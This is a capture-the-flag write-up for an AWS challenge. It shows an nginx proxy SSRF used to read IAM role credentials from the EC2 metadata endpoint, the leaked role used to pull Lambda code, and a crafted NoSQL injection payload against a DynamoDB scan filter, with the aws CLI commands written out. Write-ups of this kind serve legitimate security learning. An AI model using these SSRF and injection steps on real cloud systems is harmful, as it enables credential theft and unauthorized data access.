# Cloudy

AWS challenge for DefCamp CTF 2024.

## Description

Title: `Cloudy`

Difficulty: `Medium`

Challenge description: `A performant serverless application for storing secrets. Or, are they secrets? Note: The Admin has stored something, too.`

Attachments: `nginx.conf`

## Solution

We can see that the page only interacts with two endpoints, `/bucket/` and
`/lambda/`. The backend (nginx) redirects the traffic to the corresponding
AWS service URL, as can be seen in nginx.conf:

```
    location ~/bucket/(.*)$ {
        resolver 8.8.8.8;
        proxy_pass http://$1.s3.eu-central-1.amazonaws.com/;
    }
```

But the path is unsafely passed to `proxy_pass`, so SSRF can be performed
by simply requesting something like `/bucket/ADDRESS/PATH%3F`. The `%3F` is
needed in order for the following part do be ignored (passed as a get
parameter).

Being an AWS challenge, we can query the metadata endpoint and check for
attached roles. Everything is documented on [HackTricks](https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery/cloud-ssrf).

Querying for IAM roles 
(`GET /bucket/169.254.169.254/latest/meta-data/iam/security-credentials/%3F`), 
we can can see a role named `ctf-cloudy-EC2LambdaAccessRole-63H7MkUKN27l`. As 
the name suggests, the role can be used to interact with lambda functions in
the account. Listing the available functions returns:

```
% aws --profile ec2_leak lambda list-functions 
{
    "Functions": [
        {
            "FunctionName": "ctf-cloudy-processor-lambda",
            "FunctionArn": "arn:aws:lambda:eu-central-1:011528296162:function:ctf-cloudy-processor-lambda",
            "Runtime": "python3.10",
            "Role": "arn:aws:iam::011528296162:role/ctf-cloudy-LambdaExecutionRole-2A2kcz2TUsAE",
            ...
            "Environment": {
                "Variables": {
                    "TABLE_NAME": "ctf-cloudy-table"
                }
            },
            ...
        }
    ]
}
```

We can also get the function and download the code from the given URL.
```
% aws --profile ec2_leak lambda get-function --function-name "ctf-cloudy-processor-lambda"
{
    "Configuration": {
        "FunctionName": "ctf-cloudy-processor-lambda",
        "FunctionArn": "arn:aws:lambda:eu-central-1:011528296162:function:ctf-cloudy-processor-lambda",
        "Runtime": "python3.10",
        "Role": "arn:aws:iam::011528296162:role/ctf-cloudy-LambdaExecutionRole-2A2kcz2TUsAE",
        ...,
    "Code": {
        "RepositoryType": "S3",
        "Location": "https://awslambda-eu-cent-1-tasks.s3.eu-central-1.amazonaws.com/snapshots/..."
    }
}
```

Upon inspecting the code, we can see that the function handles files uploaded
to s3 and adds their content to DynamoDB (if they are CSV). The lambda also 
handles the user searches, querying the same database for secrets that were 
previously uploaded. However, the DynamoDB query is susceptible to NoSQL
injection, because the user input is directly passed into the query:

```py
def query_dynamodb(search):
    scan_filter = '''
        {
            "Name": {
                "ComparisonOperator": "EQ",
                "AttributeValueList": [{"S": "%s"}]
            }
        }
    ''' % search

    response = dynamodb.scan(
        TableName=table_name,
        ScanFilter=json.loads(scan_filter)
    )
```

But, the user input is sanitized if the event does not contain the `isRaw`
parameter. That parameter is never set by the function URL (if the lambda is
triggered through HTTP). However, if we attempt to manually invoke the 
function using the role, we can alter the parameters and perform the injection.
So, sending a query like this to the lambda should do the work:

`{"body":"{\"search\":\"INJECT\"}","isRaw":true}'`

We know the flag is somewhere in the database and contains the word `CTF`, so
querying should be simple using the AWS scan filters (documented [here](https://docs.aws.amazon.com/amazondynamodb/latest/developerguide/LegacyConditionalParameters.ScanFilter.html)).

Final payload:
`{"body":"{\"search\":\"none\\\\\"}],\\\\\"ComparisonOperator\\\\\": \\\\\"NE\\\\\",\\\\\"AttributeValueList\\\\\": [{\\\\\"S\\\\\": \\\\\"none\\\\\"}]},\\\\\"Secret\\\\\":{\\\\\"ComparisonOperator\\\\\":\\\\\"CONTAINS\\\\\",\\\\\"AttributeValueList\\\\\":[{\\\\\"S\\\\\":\\\\\"CTF\"}","isRaw":true}`

The flag can be retreived by invoking the function:
```
% aws --profile ec2_leak lambda invoke --function-name ctf-cloudy-processor-lambda --payload $(echo '{"body":"{\"search\":\"none\\\\\"}],\\\\\"ComparisonOperator\\\\\": \\\\\"NE\\\\\",\\\\\"AttributeValueList\\\\\": [{\\\\\"S\\\\\": \\\\\"none\\\\\"}]},\\\\\"Secret\\\\\":{\\\\\"ComparisonOperator\\\\\":\\\\\"CONTAINS\\\\\",\\\\\"AttributeValueList\\\\\":[{\\\\\"S\\\\\":\\\\\"CTF\"}","isRaw":true}'|base64) /dev/stdout
{"statusCode": 200, "body": {"result": "CTF{example_flag}"}}
    "StatusCode": 200,
    "ExecutedVersion": "$LATEST"
}
```